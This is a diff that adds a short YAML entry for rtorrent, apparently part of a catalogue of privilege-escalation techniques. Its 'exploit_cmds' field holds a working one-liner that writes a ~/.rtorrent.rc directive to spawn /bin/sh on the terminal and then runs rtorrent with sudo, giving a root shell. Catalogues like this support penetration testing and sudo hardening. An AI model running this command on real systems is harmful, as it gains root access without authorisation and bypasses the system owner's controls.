@@ -1,0 +1,5 @@
+name: rtorrent
+binary_path: /usr/bin/rtorrent
+exploit_cmds:
+- echo 'execute = /bin/sh,-c,"/bin/sh </dev/tty >/dev/tty 2>/dev/tty"' >~/.rtorrent.rc
+  && sudo /usr/bin/rtorrent
